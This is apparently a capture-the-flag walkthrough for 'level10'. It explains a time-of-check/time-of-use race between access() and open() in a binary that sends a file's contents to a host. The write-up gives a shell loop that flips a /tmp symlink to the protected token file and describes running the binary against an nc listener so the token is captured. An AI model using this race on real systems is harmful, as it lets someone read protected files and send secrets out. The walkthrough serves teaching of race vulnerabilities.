- level10's home contains level10 binary and a token file

- the binary read from the file argv[1] and send it to the host argv[2]:6969

- the binary calls access to verify if the calling process have read access to the file
after that comes the call to open

- we will perform a race condition attack, basically when access is called we need to argv[1]
to be a file we read access to then when open is called argv[1] should be token.
We can achieve this by switching between a symbolic link /tmp/symlink pointing to 
/home/user/level10/token and /tmp/file. Hopefully the timing will be right and /tmp/file will 
be passed to access and /home/user/level10/token will be passed to open.

- with the help of a terminal multiplexer we'll infinit loop switching /tmp/symlink from
/tmp/myfile to /home/user/level10/token.

`while true; do ln -sf /home/user/level10/token /tmp/symlink; ln -sf /tmp/myfile /tmp/symlink; done`

- we force the nc listener to keep listening (-k) even if the connection is complete then another infinite
loop running ./level10 /tmp/symlink [ip of listener]
